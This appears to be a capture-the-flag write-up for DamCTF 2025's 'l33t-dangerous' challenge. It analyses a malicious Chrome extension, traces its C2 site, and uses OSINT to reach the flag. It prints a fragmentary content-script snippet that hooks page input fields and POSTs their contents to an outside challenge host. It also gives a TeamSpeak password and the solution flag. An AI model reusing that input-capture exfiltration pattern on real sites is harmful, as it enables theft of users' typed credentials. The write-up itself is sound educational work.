                <h2 id="description">Description</h2>
                <p>I was digging through my dad’s old CDs and found this. He used to work IT for the school district. Apparently, a middle schooler installed it on a teacher’s PC and somehow got into the grading system with it. No idea how it worked, but maybe you can figure it out.</p>
                <h2 id="prewords">Preface</h2>
                <p>When the CTF started I was stunned that there was only 1 web challenge and that you had to first solve a misc challenge to even be able to attempt the web challenge.<p>
                <p>Well I regret ever being dissapointed because these 2 challenges were extremely fun and the amount of effort put into them is insane. This is part 1/2.</p>
                <h2 id="chromecrx">Chrome Extension</h2>
                <p>We are provided a file called <code>boom.crx</code> which is a chrome extension.</p>
                <p>Renaming it <code>boom.zip</code> and then unzipping it we find two files. manifest.json & content-script.js:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/boom.png"></p>
                <p>Manifest didn't contain anything special, that can't be said for the script.js file:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/scriptjs.png"></p>
                <p>It seems to be trying to hide the malicious payload by embeding a wav file. But if we scroll down we find the actual payload:</p>
                <div class="highlight">

    // whatever let's just simulate it for now
    await new Promise(resolve => setTimeout(resolve, 2000));
    return {

const config = {attributes: true, childList: true, subtree: true};

const callback = (mutationList, observer) => {

            mutation.addedNodes.forEach(node => {
                if (node.nodeName === "INPUT") {
                    node.addEventListener("input", (e) => {

                        boom.play();

                        fetch("https://mwaas.el1t3.fun/payload", {
                            method: "POST",

                </div>
                <p>Okay I'm going to be honest, i spent too much time on the wav file trying to find details using stenography... Not my brightest moment.</p>
                <p>Anyway this seems to be a malicious chrome extension without the actual payload as the comments state.</p>
                <p>The important bit is the website: <code>https://mwaas.el1t3.fun/payload</code> which when posted to shows:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/cahce.png"></p>
                <p>Removing /payload I found the C2 site's UI which looked pretty nice actually:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/c2.png"></p>
                <p>I checked the html and js of the site but found nothing interesting so off to /login we go:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/c2login.png"></p>
                <p>Now this is something I checked as soon as I saw SAML, the versions of all technologies on the site but it didn't help as everything was up to date.</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/wapp.png"></p>
                <p>Seeing as I wasn't able to do anything here I clicked register and thats where the <strong>real</strong> challenge started.</p>
                <h2 id="elitezone">WELCOME TO THE EL1T3 ZON3 FORUMS</h2>
                <p>This is a "CSGO modding forum" with a few members active. Looking at wappanalyzer again I found it was using phpBB and a custom cool theme.</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/ELITEZONE.png"></p>
                <p>Clicking I Agree I was then prompted to register, well thats a problem... Why? Well theres an impossible captcha:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/captcha.png"></p>
                <p>I tried everything, SQL injection, dirbuster, looking at old CVEs and nothing helped me get through this captcha. After a while i just started clicking everything and found I could login as a guest.</p>
                <p>Just going to index.php gave me access to 2 boards, Offtopic and CS 1.6 Server. Can you guess which name I saw?</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/boards.png"></p>
                <p>Looking through the Projects I found these members:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/members.png"></p>
                <p>2 Projects were of interest to me, these ones:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/post1.png"></p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/post2.png"></p>
                <p>I would just like to say, HOLY SHIT I LOVED THAT VIDEO. It feels so nostalgic and so of it's age (2008 ish). Thank you chall author for making it, also i found this :></p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/mistake.png"></p>
                <p>2025 omg.</p>
                <p>Anyway in the first mentioned post by CacheTheStamp3de we find a IP adress to what seems to be his maps: <code>http://44.237.105.82/cstrike</code></p>
                <p>Going here we find these folders:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/maps.png"></p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/banner.png"></p>
                <p>In the folders I found CSGO maps in .txt and .bsp formats. Going to the root directory I found the banenr with a teamspeak server, Nice!</p>
                <p>One thing I spent too much time on was to use a tool like BSP Viewer to perhaps find secrets in the maps which after 4 hours didn't seem like it was the case :(.</p>
                <h2 id="osint">Osint Mission</h2>
                <p>Remember the video? Yeah in it we see NAVI playing CSGO using Steam.</p>
                <p>Idea! What if we try looking up all the people in the forums on steam? Well doing this I found 2 profiles. CacheTheStamp3de which was private, and konata which wasn't private...</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/konata.png"></p>
                <p>BINGO! What I found was that she/he is part of a group called "Skid Force Zero" lmao.</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/steam.png"></p>
                <p>Finally I found the teamspeak password: <code>doorstuck22</code>.</p>
                <p>During the CTF I was doing the OSINT while on a walk so I didn't have access to teamspeak. Well that until I saw it on the app store for 1 Dollar...</p>
                <p>Ignoring my good financial descisions I connected to the teamspeak server and found this:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/teamspeak.png"></p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/desc.png"></p>
                <p>Now we can go back to the captcha and register an account and logging in I unlocked a new board:</p>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/hacking.png"></p>
                <p>Looking at the second post I found this:</p>
                <h2 id="flag">Flag</h2>
                <p><img src="/writeups/damctf-2025/l33t-dangerous/assets/flag.png"></p>
                <code><span style="color:#c3b8de">dam{we_wer3_the_skids_all_al0ng}</span></code>
                <h2 id="afterwords">Afterwords</h2>
                <p>This was a very nice chall. I appriciate the effort the authors put into it. The immersion was insane!</p>
                <p>But wait, theres a part 2?</p>
                <p><strong>Now that you've figured out who was behind this operation, can you figure out who else was affected?</strong></p>
            <ul>
                <li><a href="/writeups/damctf-2025/l33t-benign/">Part 2</a> <code><span style="color:#2ed8e8">web</code></li>
